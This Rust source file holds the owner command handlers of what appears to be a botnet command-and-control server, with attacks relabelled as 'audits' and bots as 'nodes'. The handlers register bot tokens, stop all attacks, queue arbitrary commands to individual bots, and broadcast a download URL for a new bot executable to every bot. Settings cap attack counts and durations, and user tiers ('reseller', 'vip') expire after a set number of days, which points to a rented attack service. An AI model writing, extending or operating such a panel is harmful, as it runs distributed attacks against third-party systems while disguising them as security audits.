use std::sync::Arc;
use crate::modules::client_manager::Client;
use crate::modules::state::AppState;
use crate::modules::error::{Result, AuditLog, log_audit_event, CncError};
use crate::modules::auth::Level;
use super::ui::*;
use super::general::show_prompt;
pub async fn handle_owner_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("System Owner Controls");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let owner_title = apply_ice_gradient("System Management");
    client.write(format!("  {}\n\r", owner_title).as_bytes()).await?;
    for item in OWNER_COMMANDS.iter() {
        let cmd_gradient = apply_gradient(item.cmd, 39, 51);
        client.write(format!("  \x1b[38;5;245m{:<15} : \x1b[0m{}\n\r", cmd_gradient, item.desc).as_bytes()).await?;
    }
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > System Owner Controls").await;
    show_prompt(client, state).await?;
    Ok(())
}
pub async fn handle_regbot_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let arch = match parts.get(1) {
        Some(a) => a.to_string(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: regnode <arch>\n\r").await?;
            client.write(b"\x1b[38;5;245mExample: regnode x86_64\n\r").await?;
            return Ok(());
        }
    };
    match state.bot_manager.register_bot(arch.clone()).await {
        Ok((_uuid, token)) => {
            client.write(format!("\x1b[38;5;82m[✓] Node registered successfully\n\r\x1b[38;5;196m[!] SAVE THIS TOKEN! IT CANNOT BE RECOVERED!\n\r\x1b[38;5;51mToken: {}\n\r\x1b[38;5;245mArch: {}\n\r", token, arch).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "REGISTER_NODE".to_string(), "SUCCESS".to_string())
                .with_target(arch);
            let _ = log_audit_event(audit_event, &state.pool).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to register node: {}\n\r", e).as_bytes()).await?;
        }
    }
    Ok(())
}
pub async fn handle_killall_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let stopped_ids = state.attack_manager.stop_all_attacks().await;
    let count = stopped_ids.len();
    for id in stopped_ids {
        state.bot_manager.broadcast_stop(id).await;
    }
    client.write(format!("\x1b[38;5;82m[✓] Stopped all {} active audits\n\r", count).as_bytes()).await?;
    let audit_event = AuditLog::new(client.user.username.clone(), "STOP_ALL_AUDITS".to_string(), "SUCCESS".to_string())
        .with_target(format!("{} audits", count));
    let _ = log_audit_event(audit_event, &state.pool).await;
    Ok(())
}
pub async fn handle_listbackups_command(client: &Arc<Client>) -> Result<()> {
    let mut entries = tokio::fs::read_dir("backups").await?;
    let mut backups = Vec::new();
    while let Ok(Some(entry)) = entries.next_entry().await {
        if let Ok(metadata) = entry.metadata().await {
            if metadata.is_file() {
                backups.push(entry.file_name().to_string_lossy().into_owned());
            }
        }
    }
    backups.sort();
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("Available Backups");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    if backups.is_empty() {
        client.write(b"  \x1b[38;5;245mNo backups found\x1b[0m\n\r").await?;
    } else {
        for backup in backups {
            let backup_gradient = apply_gradient(&backup, 39, 51);
            client.write(format!("  \x1b[38;5;245m- \x1b[0m{}\n\r", backup_gradient).as_bytes()).await?;
        }
    }
    client.write(b"\n\r").await?;
    Ok(())
}
use std::fs::File;
use flate2::write::GzEncoder;
use flate2::read::GzDecoder;
use flate2::Compression;
use tar::Archive;

pub async fn handle_restore_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let backup_name = match parts.get(1) {
        Some(n) => n.to_string(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: restore <backup_name>\n\r").await?;
            client.write(b"\x1b[38;5;245mExample: restore backup_20230101.tar.gz\n\r").await?;
            return Ok(());
        }
    };
    let path = std::path::Path::new(&backup_name);
    if path.components().count() != 1 || 
       backup_name.contains("..") || 
       backup_name.contains('/') || 
       backup_name.contains('\\') {
        client.write(b"\x1b[38;5;196m[X] Invalid backup name (path traversal detected)\n\r").await?;
        return Ok(());
    }
    if !backup_name.ends_with(".tar.gz") {
        client.write(b"\x1b[38;5;196m[X] Invalid backup file extension (must be .tar.gz)\n\r").await?;
        return Ok(());
    }
    let backup_path = std::path::Path::new("backups").join(&backup_name);
    if !backup_path.exists() || !backup_path.is_file() {
        client.write(format!("\x1b[38;5;196m[X] Backup '{}' not found or invalid\n\r", backup_name).as_bytes()).await?;
        return Ok(());
    }

    // Native Rust Restore Implementation
    let backup_path_clone = backup_path.clone();
    let restore_task = tokio::task::spawn_blocking(move || -> Result<()> {
        let tar_gz = File::open(backup_path_clone).map_err(|e| CncError::IoError(e))?;
        let tar = GzDecoder::new(tar_gz);
        let mut archive = Archive::new(tar);
        archive.unpack(".").map_err(|e| CncError::IoError(e))?;
        Ok(())
    });

    match restore_task.await {
        Ok(Ok(_)) => {
            client.write(format!("\x1b[38;5;82m[✓] System restored successfully from {}\n\r", backup_name).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "RESTORE_BACKUP".to_string(), "SUCCESS".to_string())
                .with_target(backup_name);
            let _ = log_audit_event(audit_event, &state.pool).await;
        }
        Ok(Err(e)) => {
            client.write(format!("\x1b[38;5;196m[X] Restore failed: {}\n\r", e).as_bytes()).await?;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Restore task failed: {}\n\r", e).as_bytes()).await?;
        }
    }
    Ok(())
}
pub async fn handle_db_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let action = match parts.get(1) {
        Some(a) => a.to_lowercase(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: db <backup|restore|clear>\n\r").await?;
            client.write(b"\x1b[38;5;245mExample: db backup\n\r").await?;
            return Ok(());
        }
    };
    match action.as_str() {
        "backup" => {
            let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
            let backup_name = format!("backup_{}.tar.gz", timestamp);
            let backup_dir = std::path::Path::new("backups");
            if !backup_dir.exists() {
                tokio::fs::create_dir_all(backup_dir).await?;
            }
            let backup_path = backup_dir.join(&backup_name);
            
            // Native Rust Backup Implementation
            let backup_path_clone = backup_path.clone();
            let backup_task = tokio::task::spawn_blocking(move || -> Result<()> {
                let tar_gz = File::create(backup_path_clone).map_err(|e| CncError::IoError(e))?;
                let enc = GzEncoder::new(tar_gz, Compression::default());
                let mut tar = tar::Builder::new(enc);
                
                // Add database
                if std::path::Path::new("config/rustnet.db").exists() {
                    tar.append_path("config/rustnet.db").map_err(|e| CncError::IoError(e))?;
                }
                // Add config
                if std::path::Path::new("config/server.toml").exists() {
                    tar.append_path("config/server.toml").map_err(|e| CncError::IoError(e))?;
                }
                // Add certs
                if std::path::Path::new("cert.pem").exists() {
                    tar.append_path("cert.pem").map_err(|e| CncError::IoError(e))?;
                }
                if std::path::Path::new("key.pem").exists() {
                    tar.append_path("key.pem").map_err(|e| CncError::IoError(e))?;
                }
                
                tar.finish().map_err(|e| CncError::IoError(e))?;
                Ok(())
            });

            match backup_task.await {
                Ok(Ok(_)) => {
                    client.write(format!("\x1b[38;5;82m[✓] Database backed up to {}\n\r", backup_name).as_bytes()).await?;
                    let audit_event = AuditLog::new(client.user.username.clone(), "DB_BACKUP".to_string(), "SUCCESS".to_string())
                        .with_target(backup_name);
                    let _ = log_audit_event(audit_event, &state.pool).await;
                }
                Ok(Err(e)) => {
                    client.write(format!("\x1b[38;5;196m[X] Backup failed: {}\n\r", e).as_bytes()).await?;
                }
                Err(e) => {
                    client.write(format!("\x1b[38;5;196m[X] Backup task failed: {}\n\r", e).as_bytes()).await?;
                }
            }
        }
        "clear" => {
            client.write(b"\x1b[38;5;196m[!] WARNING: This will clear all data. Are you sure? (y/n): ").await?;
            let confirm = client.read_line().await?.trim().to_lowercase();
            if confirm == "y" {
                if let Err(e) = sqlx::query("DELETE FROM attacks").execute(&state.pool).await {
                    client.write(format!("\x1b[38;5;196m[X] Failed to clear audits: {}\n\r", e).as_bytes()).await?;
                }
                if let Err(e) = sqlx::query("DELETE FROM audit_logs").execute(&state.pool).await {
                    client.write(format!("\x1b[38;5;196m[X] Failed to clear logs: {}\n\r", e).as_bytes()).await?;
                }
                client.write(format!("\x1b[38;5;82m[✓] Database cleared\n\r").as_bytes()).await?;
                let audit_event = AuditLog::new(client.user.username.clone(), "DB_CLEAR".to_string(), "SUCCESS".to_string());
                let _ = log_audit_event(audit_event, &state.pool).await;
            } else {
                client.write(b"\x1b[38;5;245m[*] Operation cancelled\n\r").await?;
            }
        }
        _ => {
            client.write(b"\x1b[38;5;196m[X] Invalid action. Use: backup, restore, clear\n\r").await?;
        }
    }
    Ok(())
}
pub async fn handle_adduser_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 4 {
        client.write(b"\x1b[38;5;196m[X] Usage: adduser <username> <password> <level> [days]\n\r").await?;
        client.write(b"\x1b[38;5;245mExample: adduser newuser p@ssword123 basic 30\n\r").await?;
        return Ok(());
    }
    let username = parts[1];
    let password = parts[2];
    let level_str = parts[3];
    let days = parts.get(4).and_then(|s| s.parse::<i64>().ok()).unwrap_or(30);
    let level = match level_str.to_lowercase().as_str() {
        "admin" => Level::Admin,
        "pro" | "reseller" | "vip" => Level::Pro,
        "basic" | "user" => Level::Basic,
        _ => {
            client.write(b"\x1b[38;5;196m[X] Invalid level. Use: admin, pro, basic\n\r").await?;
            return Ok(());
        }
    };
    let expire = chrono::Utc::now() + chrono::Duration::days(days);
    match state.user_manager.add_user(username.to_string(), password, expire, level).await {
        Ok(_) => {
            client.write(format!("\x1b[38;5;82m[\u{2713}] User '{}' added successfully\n\r", username).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "ADD_USER".to_string(), "SUCCESS".to_string())
                .with_target(username.to_string());
            let _ = log_audit_event(audit_event, &state.pool).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to add user: {}\n\r", e).as_bytes()).await?;
        }
    }
    Ok(())
}
pub async fn handle_deluser_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let username = match parts.get(1) {
        Some(u) => u.to_string(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: deluser <username>\n\r").await?;
            client.write(b"\x1b[38;5;245mExample: deluser olduser\n\r").await?;
            return Ok(());
        }
    };
    if username == client.user.username {
        client.write(b"\x1b[38;5;196m[X] You cannot delete yourself\n\r").await?;
        return Ok(());
    }
    match state.user_manager.delete_user(&username, &client.user.username).await {
        Ok(_) => {
            let clients = state.client_manager.get_all_clients().await;
            if let Some(target) = clients.iter().find(|c| c.user.username == username) {
                target.write(b"\n\r\x1b[38;5;196m[!] Your account has been deleted\n\r").await?;
                state.client_manager.remove_client(&target.id).await;
            }
            client.write(format!("\x1b[38;5;82m[✓] User '{}' deleted successfully\n\r", username).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "DELETE_USER".to_string(), "SUCCESS".to_string())
                .with_target(username);
            let _ = log_audit_event(audit_event, &state.pool).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to delete user: {}\n\r", e).as_bytes()).await?;
        }
    }
    Ok(())
}
pub async fn handle_changepass_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 3 {
        client.write(b"\x1b[38;5;196m[X] Usage: changepass <username> <new_password>\n\r").await?;
        client.write(b"\x1b[38;5;245mExample: changepass user1 newsecret\n\r").await?;
        return Ok(());
    }
    let username = parts[1];
    let new_pass = parts[2];
    match state.user_manager.change_password(username, new_pass).await {
        Ok(_) => {
            client.write(format!("\x1b[38;5;82m[✓] Password changed for user '{}'\n\r", username).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "CHANGE_PASSWORD".to_string(), "SUCCESS".to_string())
                .with_target(username.to_string());
            let _ = log_audit_event(audit_event, &state.pool).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to change password: {}\n\r", e).as_bytes()).await?;
        }
    }
    Ok(())
}
pub async fn handle_clearlogs_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[38;5;196m[!] WARNING: This will clear all system logs. Are you sure? (y/n): ").await?;
    let confirm = client.read_line().await?.trim().to_lowercase();
    if confirm == "y" {
        if let Err(e) = sqlx::query("DELETE FROM audit_logs").execute(&state.pool).await {
            client.write(format!("\x1b[38;5;196m[X] Failed to clear logs: {}\n\r", e).as_bytes()).await?;
        } else {
            client.write(b"\x1b[38;5;82m[\xE2\x9C\x93] System logs cleared\n\r").await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "CLEAR_LOGS".to_string(), "SUCCESS".to_string());
            let _ = log_audit_event(audit_event, &state.pool).await;
        }
    } else {
        client.write(b"\x1b[38;5;245m[*] Operation cancelled\n\r").await?;
    }
    Ok(())
}
pub async fn handle_userchange_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 3 {
        client.write(b"\x1b[38;5;196m[X] Usage: userchange <username> <level|expiry> <value>\n\r").await?;
        client.write(b"\x1b[38;5;245mExample: userchange user1 level admin\n\r").await?;
        return Ok(());
    }
    let username = parts[1];
    let field = parts[2].to_lowercase();
    let value = parts[3];
    let (level, expire) = match field.as_str() {
        "level" => {
            let new_level = match value.to_lowercase().as_str() {
                "admin" => Level::Admin,
                "pro" | "reseller" | "vip" => Level::Pro,
                "basic" | "user" => Level::Basic,
                _ => {
                    client.write(b"\x1b[38;5;196m[X] Invalid level\n\r").await?;
                    return Ok(());
                }
            };
            (Some(new_level), None)
        }
        "expiry" => {
            if let Ok(days) = value.parse::<i64>() {
                (None, Some(chrono::Utc::now() + chrono::Duration::days(days)))
            } else {
                client.write(b"\x1b[38;5;196m[X] Invalid days value\n\r").await?;
                return Ok(());
            }
        }
        _ => {
            client.write(b"\x1b[38;5;196m[X] Invalid field. Use: level, expiry\n\r").await?;
            return Ok(());
        }
    };
    match state.user_manager.update_user(username, level, expire).await {
        Ok(_) => {
            client.write(format!("\x1b[38;5;82m[✓] User '{}' updated successfully\n\r", username).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "UPDATE_USER".to_string(), "SUCCESS".to_string())
                .with_target(format!("{} {}", username, field));
            let _ = log_audit_event(audit_event, &state.pool).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] User '{}' not found or update failed: {}\n\r", username, e).as_bytes()).await?;
        }
    }
    Ok(())
}
pub async fn handle_config_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 3 {
        client.write(b"\x1b[38;5;196m[X] Usage: config <key> <value>\n\r").await?;
        client.write(b"\x1b[38;5;245mExample: config max_attacks 5\n\r").await?;
        return Ok(());
    }
    let key = parts[1];
    let value = parts[2];
    let mut config = state.config.write().await;
    let mut updated = false;
    match key {
        "max_attacks" => {
            if let Ok(v) = value.parse::<usize>() {
                config.max_attacks = v;
                updated = true;
            }
        }
        "max_bot_connections" => {
            if let Ok(v) = value.parse::<usize>() {
                config.max_bot_connections = v;
                updated = true;
            }
        }
        "max_user_connections" => {
            if let Ok(v) = value.parse::<usize>() {
                config.max_user_connections = v;
                updated = true;
            }
        }
        "session_timeout_secs" => {
            if let Ok(v) = value.parse::<u64>() {
                config.session_timeout_secs = v;
                updated = true;
            }
        }
        "attack_cooldown_secs" => {
            if let Ok(v) = value.parse::<u64>() {
                config.attack_cooldown_secs = v;
                updated = true;
            }
        }
        "max_attack_duration_secs" => {
            if let Ok(v) = value.parse::<u64>() {
                config.max_attack_duration_secs = v;
                updated = true;
            }
        }
        "log_level" => {
            config.log_level = value.to_string();
            updated = true;
        }
        _ => {
            client.write(format!("\x1b[38;5;196m[X] Unknown config key: {}\n\r", key).as_bytes()).await?;
            return Ok(());
        }
    }
    if updated {
        if let Err(e) = config.save() {
             client.write(format!("\x1b[38;5;196m[X] Failed to save config: {}\n\r", e).as_bytes()).await?;
        } else {
             client.write(format!("\x1b[38;5;82m[✓] Config updated: {} = {}\n\r", key, value).as_bytes()).await?;
             let audit_event = AuditLog::new(client.user.username.clone(), "UPDATE_CONFIG".to_string(), "SUCCESS".to_string())
                .with_target(format!("{}={}", key, value));
             let _ = log_audit_event(audit_event, &state.pool).await;
        }
    } else {
        client.write(format!("\x1b[38;5;196m[X] Invalid value for key: {}\n\r", key).as_bytes()).await?;
    }
    Ok(())
}
pub async fn handle_tokens_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let tokens = state.bot_manager.list_tokens().await;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("Registered Node Tokens");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    client.write("  \x1b[38;5;245mNode ID                               | Arch   | Created    | Last Used\x1b[0m\n\r".as_bytes()).await?;
    client.write("  \x1b[38;5;240m────────────────────────────────────────────────────────────────────────\x1b[0m\n\r".as_bytes()).await?;
    if tokens.is_empty() {
        client.write(b"  \x1b[38;5;245mNo active tokens found\x1b[0m\n\r").await?;
    } else {
        for token in tokens {
            let last_used = token.last_used.map(|t| t.format("%Y-%m-%d %H:%M").to_string()).unwrap_or_else(|| "Never".to_string());
            let id_gradient = apply_gradient(&token.bot_id.to_string(), 39, 45);
            let arch_gradient = apply_gradient(&token.arch, 45, 51);
            let created_gradient = apply_gradient(&token.created_at.format("%Y-%m-%d").to_string(), 51, 57);
            let last_gradient = apply_gradient(&last_used, 57, 87);
            client.write(format!("  {} | {} | {} | {}\n\r", 
                id_gradient, arch_gradient, created_gradient, last_gradient).as_bytes()).await?;
        }
    }
    client.write(b"\n\r").await?;
    Ok(())
}
pub async fn handle_revoke_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let bot_id_str = match parts.get(1) {
        Some(id) => id,
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: revoke <node_id>\n\r").await?;
            client.write(b"\x1b[38;5;245mExample: revoke 550e8400-e29b-41d4-a716-446655440000\n\r").await?;
            return Ok(());
        }
    };
    let bot_id = match uuid::Uuid::parse_str(bot_id_str) {
        Ok(id) => id,
        Err(_) => {
            client.write(b"\x1b[38;5;196m[X] Invalid Node ID format\n\r").await?;
            return Ok(());
        }
    };
    match state.bot_manager.revoke_token(bot_id).await {
        Ok(_) => {
            client.write(format!("\x1b[38;5;82m[✓] Token revoked for node {}\n\r", bot_id).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "REVOKE_TOKEN".to_string(), "SUCCESS".to_string())
                .with_target(bot_id.to_string());
            let _ = log_audit_event(audit_event, &state.pool).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to revoke token: {}\n\r", e).as_bytes()).await?;
        }
    }
    Ok(())
}
pub async fn handle_bot_queue_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 3 {
        client.write(b"\x1b[38;5;196m[X] Usage: queue <node_id> <command>\n\r").await?;
        client.write(b"\x1b[38;5;245mExample: queue 550e8400-e29b-41d4-a716-446655440000 ping 8.8.8.8\n\r").await?;
        return Ok(());
    }
    let bot_id_str = parts[1];
    let command = parts[2..].join(" ");
    let bot_id = match uuid::Uuid::parse_str(bot_id_str) {
        Ok(id) => id,
        Err(_) => {
            client.write(b"\x1b[38;5;196m[X] Invalid Node ID format\n\r").await?;
            return Ok(());
        }
    };
    match state.bot_manager.queue_command(bot_id, &command).await {
        Ok(_) => {
            client.write(format!("\x1b[38;5;82m[✓] Command queued for node {}\n\r", bot_id).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "QUEUE_COMMAND".to_string(), "SUCCESS".to_string())
                .with_target(format!("{} -> {}", bot_id, command));
            let _ = log_audit_event(audit_event, &state.pool).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to queue command: {}\n\r", e).as_bytes()).await?;
        }
    }
    Ok(())
}
pub async fn handle_update_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 2 {
        client.write(b"\x1b[38;5;196m[X] Usage: update <url> [checksum]\n\r").await?;
        client.write(b"\x1b[38;5;245mExample: update http://example.com/bot_v2.exe\n\r").await?;
        return Ok(());
    }
    let url = parts[1];
    let checksum = parts.get(2).map(|s| s.to_string());
    
    client.write(format!("\x1b[38;5;226m[!] Broadcasting update command to all bots...\n\rURL: {}\n\r", url).as_bytes()).await?;
    
    state.bot_manager.broadcast_update(url, checksum.as_deref().unwrap_or("")).await;
    
    client.write(b"\x1b[38;5;82m[\xE2\x9C\x93] Update broadcast complete.\n\r").await?;
    
    let audit_event = AuditLog::new(client.user.username.clone(), "BROADCAST_UPDATE".to_string(), "SUCCESS".to_string())
        .with_target(url.to_string());
    let _ = log_audit_event(audit_event, &state.pool).await;
    
    Ok(())
}
